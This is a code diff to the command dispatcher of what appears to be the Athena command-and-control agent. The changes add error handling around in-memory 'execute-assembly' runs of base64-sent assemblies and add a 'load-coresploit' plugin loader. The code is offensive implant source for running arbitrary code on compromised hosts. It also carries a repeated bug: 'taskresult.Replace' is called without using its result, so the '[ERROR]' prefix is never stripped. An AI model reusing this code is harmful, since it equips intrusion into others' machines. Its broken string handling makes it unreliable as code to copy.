@@ -31,6 +31,11 @@ namespace Athena.Commands
                         job.errored = true;
                         job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                     }
+                    else if (job.taskresult.StartsWith("[ERROR]"))
+                    {
+                        job.errored = true;
+                        job.taskresult.Replace("[ERROR]", "");
+                    }
                     break;
                 case "execute-assembly":
                     if (Globals.executeAssemblyTask != "")
@@ -48,22 +53,34 @@ namespace Athena.Commands
                             bool running = true;
                             ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                             job.hasoutput = true;
-                            using (var consoleWriter = new ConsoleWriter())
-                            {
+                            using (var consoleWriter = new ConsoleWriter()) {
                                 var origStdout = Console.Out;
-                                consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
-                                Console.SetOut(consoleWriter);
-                                AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
-                                while (running)
+                                try
                                 {
-                                    if (job.cancellationtokensource.IsCancellationRequested)
+                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
+                                    Console.SetOut(consoleWriter);
+                                    AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
+                                    while (running)
                                     {
-                                        job.complete = true;
-                                        AssemblyHandler.ClearAssemblyLoadContext();
-                                        running = false;
-                                        Console.SetOut(origStdout);
-                                        Globals.executeAssemblyTask = "";
+                                        if (job.cancellationtokensource.IsCancellationRequested)
+                                        {
+                                            job.complete = true;
+                                            AssemblyHandler.ClearAssemblyLoadContext();
+                                            running = false;
+                                            Console.SetOut(origStdout);
+                                            Globals.executeAssemblyTask = "";
+                                        }
                                     }
+                                }
+                                catch(Exception e)
+                                {
+                                    Globals.executeAssemblyTask = "";
+                                    job.complete = true;
+                                    job.taskresult = e.Message;
+                                    job.errored = true;
+                                    job.hasoutput = true;
+                                    running = false;
+                                    Console.SetOut(origStdout);
                                 }
                             }
                         }, job.cancellationtokensource.Token);
@@ -83,6 +100,11 @@ namespace Athena.Commands
                     {
                         job.errored = true;
                         job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
+                    }
+                    else if (job.taskresult.StartsWith("[ERROR]"))
+                    {
+                        job.errored = true;
+                        job.taskresult.Replace("[ERROR]", "");
                     }
                     break;
                 case "jobs":
@@ -156,7 +178,13 @@ namespace Athena.Commands
                         job.errored = true;
                         job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                     }
+                    else if (job.taskresult.StartsWith("[ERROR]"))
+                    {
+                        job.errored = true;
+                        job.taskresult.Replace("[ERROR]", "");
+                    }
                     break;
+                //Can these all be merged into one and handled on the server-side?
                 case "load-assembly":
                     LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                     job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
@@ -164,6 +192,10 @@ namespace Athena.Commands
                 case "load-command":
                     LoadAssembly loadcommand = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                     job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcommand.assembly),"test");
+                    break;
+                case "load-coresploit":
+                    LoadAssembly loadcs = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
+                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
                     break;
                 case "mkdir":
                     job.taskresult = checkAndRunPlugin(job.task.command, job.task.parameters);
@@ -174,6 +206,11 @@ namespace Athena.Commands
                         job.errored = true;
                         job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                     }
+                    else if (job.taskresult.StartsWith("[ERROR]"))
+                    {
+                        job.errored = true;
+                        job.taskresult.Replace("[ERROR]", "");
+                    }
                     break;
                 case "mv":
                     job.taskresult = checkAndRunPlugin(job.task.command, job.task.parameters);
@@ -183,6 +220,11 @@ namespace Athena.Commands
                     {
                         job.errored = true;
                         job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
+                    }
+                    else if (job.taskresult.StartsWith("[ERROR]"))
+                    {
+                        job.errored = true;
+                        job.taskresult.Replace("[ERROR]", "");
                     }
                     break;
                 case "reset-assembly-context":
